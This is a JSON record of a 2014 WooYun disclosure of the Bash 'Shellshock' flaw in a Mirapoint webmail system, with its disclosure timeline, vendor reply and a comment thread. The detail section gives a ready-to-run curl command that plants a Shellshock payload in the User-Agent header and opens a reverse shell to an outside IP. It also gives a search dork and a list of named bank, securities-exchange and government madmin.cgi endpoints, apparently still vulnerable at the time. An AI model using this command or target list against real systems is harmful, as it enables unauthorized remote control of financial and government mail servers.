{"id": 48507, "wybug_id": "wooyun-2014-077489", "wybug_title": "某邮件系统BASH通用远程命令执行漏洞（影响多家银行及证券邮件系统）", "wybug_corp": "某邮件系统", "wybug_author": "路人甲", "wybug_date": "2014-09-27 00:46", "wybug_open_date": "2014-12-26 00:48", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向公众公开  简要描述： 某邮件系统BASH通用远程命令执行漏洞经测试影响多个银行邮件系统 详细说明：  Mirapoint Software, Inc. 是一家总部位于美国硅谷的美国全资公司。公司成立于1997年，在全球设立多个分公司和代表处，并于2000年成功进入中国市场。Mirapoint是SpecMail标准协会副主席, IETF成员，邮件RFC标准的参与制定者。Mirapoint 10多年来一直专注于提供专业的硬件邮件系统整体解决方案。官网：http://www.mirapoint.com.cn/官网邮件系统演示curl -A \"() { :; }; /bin/bash -i > /dev/tcp/128.199.213.124/2345 0<&1 2>&1\" http://mail.mirapoint.com.cn/cgi-bin/madmin.cgi -v\n\n\nhttp://www.baidu.com/s?wd=WebMail%20Corporate%20Edition&rsv_spt=1&issp=1&f=8&rsv_bp=0&ie=utf-8&tn=baiduhome_pg\nhttp://mx2.shawneelink.net/cgi-bin/madmin.cgihttp://mailgw.btpdi.com.cn/cgi-bin/madmin.cgihttps://mail.troy.edu//cgi-bin/madmin.cgihttp://mail700.sea.ymgt-co.com/cgi-bin/madmin.cgi银行、政府、证券\n上海银行：http://mail.bankofshanghai.com/cgi-bin/madmin.cgi银联商务：http://mail.chinaums.com/cgi-bin/madmin.cgi           http://mail.bjjc.gov.cn/cgi-bin/madmin.cgi长沙银行：http://61.187.87.92/cgi-bin/madmin.cgi安信证券：http://mail.essence.com.cn/cgi-bin/madmin.cgi上海证券交易所：https://email.sse.com.cn/cgi-bin/madmin.cgi\n\n\n\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-09-29 13:43 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-27 01:07 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  这算通用嘛？    \n     2014-09-27 08:08 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @玉林嘎 跟st2类似    \n     2014-09-27 10:10 |    \t\terror \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:96        )\t\t \n  这标题有点欠揍    \n     2014-09-27 12:16 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  @error @乐乐、 @玉林嘎 bash是服务器里一种命令控制符软件，类似windows中的cmd，本身就unix系统自带的，又不是集成到邮件系统里的算毛通用漏洞？    \n     2014-09-27 12:24 |    \t\t胖子 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:16        | 加大你的带宽!加大你的内存!加大你的显示器...)\t\t \n  这标题有点欠揍     \n     2014-09-27 12:52 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  @玉林嘎 @乐乐、 @error @胖子 @X防部 乌云有乌云标准。你们在卧槽什么    \n     2014-09-27 13:14 |    \t\terror \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:96        )\t\t \n  哈哈,终于把此洞的路人甲逼现身了 @YY-2012 大牛一枚鉴定完毕     \n     2014-09-27 13:32 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  @error 你想多了。。    \n     2014-09-27 13:54 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @YY-2012 你哪只眼睛看见卧槽了    \n     2014-09-27 14:06 |    \t\tSiro \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:11        | )    <Freedom />    (Fuck)\t\t \n  目测括号是审核时候加的～    \n     2014-09-27 14:55 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  @X防部 按你的意思是 因为Struts2漏洞影响到用struts2开发CMS 也不算通用咯？    \n     2014-09-27 15:16 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  @erevus 如果一个CMS存在ST2当然算通用 因为这个ST2是打包在CMS里的！但是bash可不是打包进CMS的，是直接存在于操作系统里的，BASH确切的来说是系统软件漏洞，就算没有系统里没有bash，cms也可以运行。只不过系统里有bash，cms可以调用bash执行命令（bash本来就是命令执行工具相当于window里的cmd），如果系统里没有bash，cms调用不了bash所以就不存在漏洞。    \n     2014-09-27 15:22 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  @erevus 另外只有很少一部分Linux系统集成了这种名为Bash的Unix系统中用于控制命令提示符的软件，    \n     2014-09-27 16:05 |    \t\t树上草 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:8        | <img height=\"12\" width=\"12\" style=\"verti...)\t\t \n  这么叼，真的好吗    \n     2014-09-27 17:31 |    \t\tSuner \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:2        | 洞次打次)\t\t \n  欧巴都说屌    \n     2014-09-27 19:34 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @X防部 抱歉st2属于框架问题，不属于通用，如果PHP代码中附带了某些如system(bash)可与bash打交道的，属于程序设计缺陷吧    \n     2014-09-27 23:21 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  @X防部 很少的一部分？很多Linux发行版将bash作为默认shell的好吧……我能列举出RHEL系(CentOS也属于)、Ubuntu、Debian、Fedora等……    \n     2014-12-26 08:55 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  这个都有2个money啊。。我也是最了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}